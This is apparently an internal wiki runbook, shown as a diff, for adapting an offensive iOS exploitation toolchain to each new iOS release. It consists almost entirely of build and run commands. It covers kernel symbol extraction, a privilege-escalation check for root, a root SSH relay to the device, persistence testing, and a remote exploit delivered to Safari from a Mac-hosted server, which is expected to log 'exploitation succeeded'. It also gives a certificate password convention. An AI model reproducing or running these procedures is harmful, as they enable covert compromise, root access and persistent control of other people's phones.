@@ -1,0 +1,451 @@
+
+                        iOS Triage Process
+This describes the process needing to been done when a new iOS version is released.
+Pre Setup
+
+Make a directory store output folders
+mkdir OUT
+set $OUTexport OUT=`pwd`/OUT (PWD = mac command for present working directory)
+
+
+
+Grab the entire ios_manifest
+mkdir ios_repo and change into it
+repo init -u ssh://git@stash.devlan.net:7999/ios/ios_manifest
+
+repo sync
+verify your iOS manifest is on the right branch for the current version of iOS to be testedchange into the .repo/manifests/ dir and verify you are on the correct manifest branch if not check out the right branch and re-sync
+
+set $IOS_REPOexport IOS_REPO=`pwd`/ios_repo
+
+
+
+Grab a testdylib for testing external to the IOS_REPO
+get testdylib_manifest
+repo init -u ssh://git@stash.devlan.net:7999/ios/testdylib_manifest
+
+repo sync
+
+
+cd into testdylib_repo/testdylib
+make
+CD ..
+set $TEST_DYLIBexport TEST_DYLIB=`pwd`/Build/Release-iPhoneOS/testdylib/testmain
+
+
+
+
+Make sure ghidra_dir installed
+
+must be at least version 6
+in your ghidra install look for a folder that contains "ghidraRun"
+set $GH_PATH to the path specified above
+export GH_PATH=<path>use full path and NOT relative path
+
+
+
+Install the enterprise certificate
+In a finder window goto /Volumes/share/MDB/iOS/iOSFiles
+double click "Viper Ball Hunt Golf.developerprofile" 
+this will open xcode to import the profile
+the password is the file name minus .developerprofile
+
+
+double click ios_distribution.cer
+double click tag.p12might error importing but ignore the error
+
+double click testing.mobileprovision
+
+
+
+List of tools now needed
+Xcode Developer Disk Image (DMG) 
+Install Xcode (get the lastest version released that should be on the MDB share /MDB/OSX/Software/Apple/Xcode/<newest version>)If it is not get with Inventory Managerfind DMG in xcode directory (/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/<current version>/DeveloperDiskImage.dmg))
+
+
+put with the other DMG's ( external_binaries/apple/dmg/<version> )
+
+
+Saline
+
+cd $IOS_REPO/saline
+make clean
+make
+run saline $IOS_REPO//Dist/Release-MacOSX/saline $TEST_DYLIB
+
+
+Adderall
+
+cd into $IOS_REPO/nightvision/python/cd $IOS_REPO/nightvision/python/
+
+open nv_kern_read_command.py in an editor 
+update kernel_info to include latest version number if not already present
+in get_ios_type, verify correct version number is in there
+
+
+update make files in $IOS_REPO/early-make by adding new prefix to new to the lists ( cd to $IOS_REPO/early-make and run subl . to open all for editing in sublime)
+early-bokken 
+early-close
+early-persist 
+early-remote 
+
+
+update rana
+update match function in $IOS_REPO/rana/ranas/<proper>_rana.py
+<proper> is most likely saline
+update means to ensure a verification is there for the current build version if not add another or  version.re is not none to the if statement
+
+
+cd $IOS_REPO/adderall
+make clean
+make
+under $OUT make a folder for adderall files
+mkdir $OUT/adder_files
+set $AD_OUTexport AD_OUT=$OUT/adder_files
+
+
+
+cd $IOS_REPO/Dist/Release-MacOSX/
+
+./adderall-dist $AD_OUT
+Hopefully have execution
+If theses are beta version then copy the folder in your $AD_OUT to: /Volumes/share/MDB/iOS/iOSFiles-Beta/
+If theses are not beta version then copy the folder in your $AD_OUT to: /Volumes/share/MDB/iOS/iOSFiles/
+
+Saline-Dist
+
+cd $IOS_REPO/saline
+git checkout -b <descriptive_name>
+make saline_dist_maker
+../Dist/Release-MacOSX/saline_dist_maker $AD_OUT saline-dist/
+Then push the changes to the repo
+
+Symdra / Elsym
+
+under $OUT make a folder for symdra files
+mkdir $OUT/sym_files
+we will call it $SYM_OUT
+export SYM_OUT="$OUT/sym_files" 
+
+
+create branch for elsym-dist
+cd $IOS_REPO/elsym-dist/
+git checkout -b <descriptive_name>
+
+
+
+cd back to $IOS_REPO
+cd $IOS_REPO
+
+run symdra from the $IOS_REPO directory
+python symdra/ full -k $AD_OUT -a $SYM_OUT -g $GH_PATH -b <build_number_for_device>ex. "-b 13A4325c"
+
+
+(YES you are running python on a folder)
+
+
+When done symbol.db in $SYM_OUTls $SYM_OUT/*/symbol.db
+
+This will be feed into Elsym
+Check that the symbol.db is good
+sqlite3 $SYM_OUT/<IPSW>/symbol.db
+select * from [ Master_Symbols ];
+.exit
+
+
+verify elsym
+cd $IOS_REPO/elsym
+git checkout -b <descriptive_name>
+el.py
+make sure build number is in the list
+might need to change "EL_CONFIG_LWVM_PARITION_FLAG_OFFSET"For iOS 8.4 we had to change it to 0x28. To determine:
+Open ghidra
+File -> Open Project
+goto the symdra_results/<IPSW>/Ghidra/kernelcache.gpr
+Open the System.kext and search for the string "disk0s1", "disk0s1s1", "Writable", and/or "UUID"
+This function is bsd_init (note this is heavily inlined and may not fully decompile)
+Find the call to _VNOP_IOCTL
+The second parameter is the ioctl number we need (in the past was 0xc01064c2 but might be broken into two instructions)
+Note the ioctl number
+Open com.apple.driver.LightweightVolumeManager.kext
+Search Program Text for the ioctl number (note you may want to search for half of it at a time) being used in a comparison
+This function is the ioctl handler
+Inside the true block of the conditional, look for the constants on the ioctl
+One of the commands sets a read-only field (1), the offset for this field is the LWVM_PARTION_FLAG_OFFSET.
+
+
+
+
+
+run and see what happen
+ZOO_IPSW_PATH=$SYM_OUT make copyonedist ZOO_TARGET=<IPSW>
+ex. ZOO_IPSW_PATH=$SYM_OUT make copyonedist ZOO_TARGET=iPad4,1_9.0_13A341
+_kernel_memory_allocate is only used for the development
+
+
+
+python verify.py $IOS_REPO/elsym-dist/
+python print_config.py $IOS_REPO/elsym-dist/el_<IPSW>.plist
+
+
+(folder: elsym) If changes to elsym were made put up for pull request
+(folder: elsym-dist) For new el_*.plist put up for pull requests
+copy the contents of $SYM_OUT to the symdra-dist folder on the share (/MDB/iOS/symdra-dist)
+
+El_util
+
+cd $IOS_REPO/elutil
+make clean
+ZOO_IPSW_PATH=$AD_OUT make ZOO_IPSWS="<target>"ex. make ZOO_IPSWS=iPhone6,1_13A341
+
+el_runo.sh don't use even if it is in the directory
+cd $IOS_REPO/rana
+make
+
+python $IOS_REPO/Build/Release-MacOSX/rana.pyz -a execute $IOS_REPO/Build/Release-iPhoneOS/elutil/<IPSW>/el_priv
+should be "uid = 0, euid = 0"
+
+
+Nightvision
+
+under $OUT make a folder for nightvision files
+mkdir $OUT/nv_files
+we will call it $NV_OUT
+export NV_OUT="$OUT/nv_files" 
+
+
+cd $IOS_REPO/nightvision
+make clean
+ZOO_IPSW_PATH=$AD_OUT make dist
+$IOS_REPO/Dist/Release-iPhoneOS/nv -c $IOS_REPO/elsym-dist/ get -o $NV_OUT/ 
+
+tar -tvf $NV_OUT/<IPSW>..tbz  | grep "/private/var/root"
+You should see files in the list
+
+
+El_unit
+
+cd $IOS_REPO/elunit
+make clean
+make ZOO_IPSW_PATH=$AD_OUT 
+After the app is install you might have to click on it yourself and trust itIf so also make sure on the device "Settings->Developer->Enable UIUser Interface Automation" is on
+
+If you had to do any of step 3 you may need to rerun it
+should only have 1 failed test
+open xml from output"BUG root: copying dev eltesto/TestNandao.xml -> local <xml>"
+
+Failure should be in TestNandao.m
+
+El_ssh
+
+cd $IOS_REPO/el_ssh
+EL_SSH_ACCESS="close" make clean
+
+EL_SSH_ACCESS="close" ZOO_IPSW_PATH=$AD_OUT make
+
+If you get the following error
+el_ssh/Makefile:46: *** No ipsw resources for <target> .  Stop.
+copy the plist from your elsym-dist from the symdra test into the elsym-dist in your manifest
+
+
+cd $IOS_REPO/Dist/Release-iPhoneOS
+./el_ssh install
+./el_ssh run
+./el_ssh dumpkey ssh.key
+open new terminal (command+t)
+./el_ssh relay -p 2222
+open new terminal (command+t)
+ssh -i ssh.key -p 2222 root@localhost
+ls bin_nohash
+go back to original terminal
+
+Persistence
+
+
+cd $IOS_REPO/dyld-js/
+
+ZOO_IPSW_PATH=$AD_OUT make dylinker_test ZOO_CONFIG=Debug
+cd $IOS_REPO/Dist/Release-iPhoneOS
+./scp -i ssh.key -P 2222 $IOS_REPO/Build/Debug-iPhoneOS/dyld-js/dylinker_test_<arch>.js root@localhost:
+ssh into device
+go back to terminal with it openOR
+see el_ssh instructions
+
+
+/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc dylinker_test_<arch>.js
+You should see [dylinker] 7 of 7 passed.
+
+Remote
+(This will work on 8.4.1 and earlier, NEED to write up HAMR instructions for 9 and newer)
+
+cd $IOS_REPO/mcnugget 
+cd mcp_archon
+edit archon.pyvariable = iOS
+
+edit earth.pyvariable = iOS
+
+edit soul.py(doesn't actually check version) we are good
+
+on the device change setting
+Settings -> Safari -> Advanced -> Web Inspector (turn on)
+Settings -> Developer -> Enable UIUser Interface Automation (turn on)
+
+
+make clean
+ZOO_IPSW_PATH=$AD_OUT ZOO_CONFIG=Release make delivery
+cd $IOS_REPO/Build/Release-MacOSX/mcnugget/
+
+./mc_creator plist --url http://<ip>:8080 --server-port 8080 -t myid mc.plist --console --passphrase ""
+
+<ip> is the ip of your Mac ( not your iDevice)
+OR if your feel like cheating ./mc_creator plist --url http://`ifconfig | grep "inet 10" | cut -d " " -f 2`:8080 --server-port 8080 -t myid mc.plist --console --passphrase ""
+
+
+
+./solcreate mc.plist /<path>/testdylib.zip -t myid -o myid.sol --nonpersist
+./mc_creator server mctest mc.plist mcplugins/mcp_* myid.sol
+
+./mctest 
+
+press enter when prompted for passphrase
+wait for ENGINE Bus STARTED
+
+
+Make sure device is on wifi
+Connect device via usb then run python mdf syslog
+
+verify safari is not loaded in memory on target
+On device open safari then browse to http://<ip>:8080/?id=myid
+
+On mctest log you should see"exploitation succeeded, deleting from target dictionary"
+
+
+In the syslog you should see the 
+"iPhone locationd[57] <Emergency>: ==== Testdylib Started at:"
+
+
+Related articles
+iOS Firmware Updating to latest procedure / Adding Exploit Support For New Devices  
+
+('contentbylabel' missing)
+('details' missing)
+
+Attachments:
+
+enterprise_certs
+
+
+Sub-Pages:
+
+
+Notes from iOS 8.4.1 Triage 
+
+
+iOS Firmware Updating to latest procedure / Adding Exploit Support For New Devices 
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+| 33 
+| 34 
+| 35 
+| 36 
+| 37 
+| 38 
+| 39 
+| 40 
+| 41 
+| 42 
+| 43 
+| 44 
+| 45 
+| 46 
+| 47 
+| 48 
+| 49 
+| 50 
+| 51 
+| 52 
+| 53 
+| 54 
+| 55 
+| 56 
+| 57 
+| 58 
+| 59 
+| 60 
+| 61 
+| 62 
+| 63 
+| 64 
+| 65 
+| 66 
+| 67 
+| 68 
+| 69 
+| 70 
+| 71 
+| 72 
+| 73 
+| 74 
+| 75 
+| 76 
+| 77 
+| 78 
+| 79 
+| 80 
+| 81 
+| 82 
+| 83 
+| 84 
+| 85 
+| 86 
+| 87 
+| 88 
+| 89 
+| 90 
+| 91 
+| 92 
+| 93 
+| 94 
+| 95 
+| 96 
+| 97 
+| 98 
+| 99 
+| 100 
+| 101 
+|
+                    
